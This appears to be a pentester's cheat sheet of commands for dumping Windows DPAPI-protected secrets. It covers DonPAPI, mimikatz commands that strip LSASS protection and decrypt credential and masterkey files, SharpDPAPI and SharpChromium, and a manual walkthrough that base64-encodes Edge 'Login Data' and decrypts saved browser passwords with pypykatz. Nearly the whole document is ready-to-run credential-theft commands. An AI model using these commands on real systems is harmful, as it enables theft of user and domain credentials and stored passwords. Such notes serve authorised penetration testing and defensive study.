---
title: "DPAPI"
date: 2024-7-31
tags: ["DPAPI", "enum", "Windows", "password", "credentials", "DonPAPI"]
---

---
### Abuse #1: Auto dump (From Linux)

[DonPAPI](https://github.com/login-securite/DonPAPI)

```bash
DonPAPI collect -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -t <TARGET>
```

### Abuse #1: Auto dump (From Windows - mimikatz)

#### 1. Info Gathering

```powershell
cmd /c "dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect"
```

#### 2. Secrets Dump

```powershell
mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' '"dpapi::masterkey /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect\<SID>\<PROTECT_HASH> /sid:<SID> /password:<PASSWORD> /protected"' '"dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' "exit"
```

### Abuse #1: Auto dump (From Windows - SharpDPAPI.exe)

```bash
# Run as system
.\SharpDPAPI.exe machinetriage
```

```bash
# Run as user
.\SharpDPAPI.exe credentials /password:<PASSWORD>
```

### Abuse #2: Browser Saved Creds (Automatic)

[SharpChromium.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe)

```powershell
.\SharpChromium.exe logins
```

### Abuse #2: Browser Saved Creds (Manual)

#### 1. Prepare logindata and localstate file

```powershell
# Get Local State json file, copy and paste to local Linux
type "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Local State"
```

```powershell
# Get Login Data binary file
certutil -encode "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\ProgramData\logindata
```

```powershell
# Copy and paste to local Linux
type C:\ProgramData\logindata
```

```bash
# Base64 decode
cat logindata_b64 | base64 -d > logindata
```

```bash
# Extract key from local state
cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
```

[pypykatz](https://github.com/skelsec/pypykatz)

```bash
# Get masterkey_guid
pypykatz dpapi describe blob blob
```

#### 2. Retrieve Keys

```powershell
# Get master key
certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY_GUID>" C:\ProgramData\<MASTERKEY_GUID>
```

```powershell
# Copy and paste to local Linux
type C:\ProgramData\<MASTERKEY_GUID>
```

```bash
# Base64 decode
cat masterkey_guid_b64 | base64 -d > masterkey_guid
```

#### 3. Decrypt

```bash
pypykatz dpapi prekey password <SID> <USER_PASSWORD> | tee pkf
```

```bash
pypykatz dpapi masterkey <MASTERKEY_GUID_FILE> pkf -o mkf
```

```bash
pypykatz dpapi chrome --logindata logindata mkf localstate
```

### Abuse #3: Decrpyt Masterkey without password

```powershell
# Take note: Last key
.\mimikatz.exe "dpapi::masterkey /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /rpc" exit
```

```powershell
# Decrypt
.\mimikatz.exe "dpapi::cred /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /masterkey:<KEY>" exit
```

<br>